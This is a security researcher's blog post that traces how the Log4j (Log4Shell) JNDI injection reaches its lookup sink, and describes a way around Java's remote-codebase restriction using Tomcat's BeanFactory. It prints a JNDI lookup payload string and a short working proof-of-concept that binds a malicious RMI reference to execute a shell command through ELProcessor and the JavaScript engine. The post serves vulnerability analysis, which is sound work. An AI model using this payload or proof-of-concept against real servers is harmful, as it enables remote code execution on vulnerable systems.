---
layout: "post"
title: "Log4j Analysis: More JNDI Injection"
date: "2021-12-10 19:19:03"
date_gmt: "2021-12-10 19:19:03"
modified: "2021-12-10 19:19:03"
modified_gmt: "2021-12-10 19:19:03"
slug: "log4j-analysis-more-jndi-injection"
author: "brandonshi123"
status: "publish"
type: "post"
original_url: "https://y4y.space/2021/12/10/log4j-analysis-more-jndi-injection/"
guid: "https://y4y.space/?p=441"
wordpress_id: 441
parent_id: 0
categories: ["Uncategorized"]
---

{% raw %}
To be fair, the attack chain is pretty straight forward. I kinda hope all the other vulnerabilities are easy to analyze like this one…

## log4j

By looking at log4j's official documents, it's not hard to get an idea on how it basically works. To build a test environment, start a new Java project, and add log4j as library.

```html
Logger logger = LogManager.getLogger();
logger.error("${jndi:rmi://<ip>/<ref>}");
```

When the message enters the `error()` method, it will be passed into `logIfEnabled()`.

![](https://i.imgur.com/Q322PjY.png)

Then if `isEnabled()` returns true, it will continue to `logMessage()` method.

![](https://i.imgur.com/kP2QX9y.png)

By default(I assume), only `fatal` and `error` log levels are enabled, but the status can be checked by `isInfoEnabled()` and other functions. Since only enabled levels will get code execution, so make sure you are using the right log level.

![](https://i.imgur.com/0hO8mv0.png)

And `logMessage()` calls `logMessageSafely()`:

![](https://i.imgur.com/lBakv7R.png)

And that will enter `logMessageTrackRecursion()`…

![](https://i.imgur.com/0OcSQFo.png)

Then to `tryLogMessage()`…

![](https://i.imgur.com/n34ddfn.png)

Next, to `log()`…

![](https://i.imgur.com/TQwQVEj.png)

After some checkings and other operations, it will go to `PatternFormatter.format()` method, and calls `format()` method from `MessagePatternConverter` class.

![](https://i.imgur.com/1GGzyGv.png)

And if `config` is not null, and `nolookups` variables is set to false, it will continue and check if the string starts with `${`.

Now, before we dive deeper, let's figure where `nolookups` variable is from.

![](https://i.imgur.com/CI5bpET.png)

It's a boolean value(duh), and it depends on `Constants.FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS` and `noLookupsIdx >= 0`.

`noLookupsIdx` comes from `loadNoLookups(options)`:

![](https://i.imgur.com/UElyLdC.png)

with `NOLOOKUPS` being a constant:

![](https://i.imgur.com/EWDGXBc.png)

Since there is no option provided, `loadNoLookups()` will return -1, which makes `noLookupsIdx >= 0` false.

Then the constant thing comes from properties value:

![](https://i.imgur.com/QtfS6I1.png)

and as you probably see from some mitigations require the `-Dlog4j2.formatMsgNoLookups=true` JVM option to be set, or setting `log4j2.formatMsgNoLookups=true` in `log4j2.component.properties` file, that's how it works.

![](https://i.imgur.com/nZcBODF.png)

![](https://i.imgur.com/X6XehOS.png)

And let's continue to go down the road. In

```java
workingBuilder.append(config.getStrSubstitutor().replace(event, value));
```

![](https://i.imgur.com/vQvtE3o.png)

`substitute()` is called:

![](https://i.imgur.com/t7vqM0F.png)

and…eventually `resolveVariable()` will be called.

![](https://i.imgur.com/qkObPjX.png)

this method resolves the variable, and do lookup call for the correspond event. As you can see, there is a `jndi` event.

![](https://i.imgur.com/Wo316A9.png)

and the `lookup()` method:

![](https://i.imgur.com/qLouyja.png)

with `strLookupMap` containing values of:

![](https://i.imgur.com/BLyjN15.png)

and finally, the `JndiLookup` call.

![](https://i.imgur.com/sWUqDls.png)

![](https://i.imgur.com/DwkT7KT.png)

And, that's the entire data flow, from source, to sink.

## More JNDI Injection

So, last time in my analysis of CVE-2021-21985 was my first encounter with JNDI injection. The most basic way to execute a remote lookup is by setting up a RMI registry, and a HTTP server to host the actual compiled malicious Java class.

In higher versions of Java, a property is set by default, so that Java will not load remote codebase. But some researchers discovered a new way to bypass such restriction.

When a refernece is looked up, it will be decoded, and `getObjectReference` will be called.

![](https://i.imgur.com/K416uGT.png)

which then calls `getObjectFactoryFromReference`

![](https://i.imgur.com/S1TINvI.png)

![](https://i.imgur.com/LxikVBy.png)

and that, loads the class with a new instance.

Since a remote codebase will not be loaded, but can still be looked up. If a local reference factory is viable, it can still work.

In `org.apache.naming.factory.BeanFactory#getObjectInstance`, there is a way to use reflection to invoke methods.

![](https://i.imgur.com/xORHMLm.png)

from the reference with name `forceString`.

![](https://i.imgur.com/h5VN6KM.png)

and eventually…

![](https://i.imgur.com/4nmO5J9.png)

There is a lot more code I didn't include, if you are interested, do the research on your own.

Here is the PoC code:

```java
ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
ref.add(new StringRefAddr("forceString", "x=eval"));
ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','open /Applications/Calculator.app']).start()\")"));
ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
registry.bind("calc", referenceWrapper);
```

And it calls the `eval` method in `ELProcessor`. One interesting thing about the payload is, it uses the JavaScript engine in Java. Oh boy, is that a pain to work with. With the script engine, you can do more that just a exec one liner. Since in the JS engine, there is no type, you need to assign types to variables, like

```javascript
var Thread = Java.type('java.lang.Thread')
var classLoader = Thread.getCurrentThread().getContextClassLoader();
```

and hey, reflection also works. But providing parameters is a hell.

## Conclusion

I wanted to write more, but I want to sleep RIGHT NOW so if there is more, probably will be saved for later. Hope you learned something new like I did, idk, idc. Oh yeah, and hope I didn't spread false knowledge.
{% endraw %}
